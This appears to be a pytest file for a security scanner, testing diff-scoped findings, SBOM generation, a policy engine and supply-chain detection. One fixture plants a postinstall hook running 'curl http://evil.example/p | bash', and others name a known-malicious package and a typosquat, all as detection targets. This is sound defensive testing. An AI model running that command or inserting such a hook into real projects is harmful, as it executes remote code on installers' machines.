"""Tests for Phase 1 platform features: diff scan, SBOM, policy, supply-chain."""

from __future__ import annotations

import json
from datetime import datetime, timezone
from pathlib import Path

from argus.analysis.diff_scan import (
    DiffScope,
    filter_findings,
    finding_in_diff,
    resolve_diff,
)
from argus.core.models import Finding, Location, Severity
from argus.core.project import Project
from argus.policy.engine import evaluate
from argus.sbom.cyclonedx import build_cyclonedx


def _finding(rule, path="app.py", line=10, scanner="patterns"):
    return Finding(
        id=f"{rule}:{line}", rule_id=rule, scanner=scanner,
        title=rule, description="",
        location=Location(path=path, start_line=line),
        severity=Severity.HIGH,
    )


# --- diff scan -------------------------------------------------------------
def test_finding_in_diff_matches_changed_line():
    scope = DiffScope(changed_lines={"app.py": {10, 11}}, changed_files=frozenset({"app.py"}))
    assert finding_in_diff(_finding("x", line=10), scope)
    assert not finding_in_diff(_finding("x", line=99), scope)


def test_finding_in_diff_matches_dependency_manifest():
    scope = DiffScope(changed_lines={}, changed_files=frozenset({"package-lock.json"}))
    f = _finding("deps.cve", path="package-lock.json", line=None, scanner="dependencies")
    assert finding_in_diff(f, scope)


def test_filter_findings_counts_suppressed():
    scope = DiffScope(changed_lines={"a.py": {1}}, changed_files=frozenset({"a.py"}))
    kept, suppressed = filter_findings(
        [_finding("r", path="a.py", line=1), _finding("r", path="b.py", line=1)],
        scope,
    )
    assert len(kept) == 1
    assert suppressed == 1


def test_resolve_diff_local_repo(tmp_path: Path):
    import subprocess

    subprocess.run(["git", "init"], cwd=tmp_path, check=True, capture_output=True)
    subprocess.run(["git", "config", "user.email", "t@example.com"], cwd=tmp_path, check=True)
    subprocess.run(["git", "config", "user.name", "T"], cwd=tmp_path, check=True)
    f = tmp_path / "app.py"
    f.write_text("a = 1\n", encoding="utf-8")
    subprocess.run(["git", "add", "app.py"], cwd=tmp_path, check=True)
    subprocess.run(["git", "commit", "-m", "init"], cwd=tmp_path, check=True)
    f.write_text("a = 1\nb = 2\n", encoding="utf-8")
    subprocess.run(["git", "add", "app.py"], cwd=tmp_path, check=True)
    subprocess.run(["git", "commit", "-m", "add b"], cwd=tmp_path, check=True)
    scope = resolve_diff(tmp_path, "HEAD~1...HEAD")
    assert "app.py" in scope.changed_files


# --- SBOM ------------------------------------------------------------------
def test_build_cyclonedx_from_requirements(tmp_path: Path):
    (tmp_path / "requirements.txt").write_text("requests==2.31.0\n", encoding="utf-8")
    project = Project.from_path(tmp_path)
    doc = build_cyclonedx(project, name="demo")
    assert doc["bomFormat"] == "CycloneDX"
    assert doc["specVersion"] == "1.5"
    names = {c["name"] for c in doc["components"]}
    assert "requests" in names


def test_sbom_component_has_purl(tmp_path: Path):
    (tmp_path / "requirements.txt").write_text("flask==3.0.0\n", encoding="utf-8")
    doc = build_cyclonedx(Project.from_path(tmp_path))
    comp = doc["components"][0]
    assert comp["purl"].startswith("pkg:pypi/")


# --- policy engine ---------------------------------------------------------
def test_policy_blocks_on_severity():
    result = type("R", (), {})()
    result.findings = [
        _finding("x", scanner="patterns"),
        Finding(
            id="c:1", rule_id="y", scanner="secrets", title="s", description="",
            location=Location(path="k"), severity=Severity.CRITICAL,
        ),
    ]
    policies = [{"id": "block-critical", "when": {"severity": "critical"}, "action": "block"}]
    outcome = evaluate(result, policies)  # type: ignore[arg-type]
    assert not outcome.passed
    assert len(outcome.blocked) == 1
    assert outcome.blocked[0].policy_id == "block-critical"


def test_policy_scanner_match():
    from argus.core.models import ScanResult

    result = ScanResult(target="t", started_at=datetime.now(timezone.utc))
    result.add(_finding("s", scanner="secrets"))
    policies = [{"id": "no-secrets", "when": {"scanner": "secrets"}, "action": "warn"}]
    outcome = evaluate(result, policies)
    assert outcome.passed
    assert len(outcome.warned) == 1


# --- supply-chain scanner --------------------------------------------------
def test_supply_chain_flags_known_malicious(tmp_path: Path):
    from argus.core.config import Config
    from argus.core.plugin import ScannerContext
    from argus.scanners.supply_chain import SupplyChainScanner

    (tmp_path / "package.json").write_text(
        json.dumps({"dependencies": {"flatmap-stream": "0.1.0"}}),
        encoding="utf-8",
    )
    ctx = ScannerContext(project=Project.from_path(tmp_path), config=Config())
    findings = list(SupplyChainScanner().scan(ctx))
    assert any(f.rule_id == "supply-chain.known-malicious" for f in findings)


def test_supply_chain_typosquat(tmp_path: Path):
    from argus.core.config import Config
    from argus.core.plugin import ScannerContext
    from argus.scanners.supply_chain import SupplyChainScanner

    (tmp_path / "requirements.txt").write_text("requestss==1.0.0\n", encoding="utf-8")
    ctx = ScannerContext(project=Project.from_path(tmp_path), config=Config())
    findings = list(SupplyChainScanner().scan(ctx))
    assert any(f.rule_id == "supply-chain.typosquat" for f in findings)


def test_supply_chain_suspicious_npm_script(tmp_path: Path):
    from argus.core.config import Config
    from argus.core.plugin import ScannerContext
    from argus.scanners.supply_chain import SupplyChainScanner

    (tmp_path / "package.json").write_text(
        json.dumps({"scripts": {"postinstall": "curl http://evil.example/p | bash"}}),
        encoding="utf-8",
    )
    ctx = ScannerContext(project=Project.from_path(tmp_path), config=Config())
    findings = list(SupplyChainScanner().scan(ctx))
    assert any(f.rule_id == "supply-chain.npm-lifecycle-script" for f in findings)
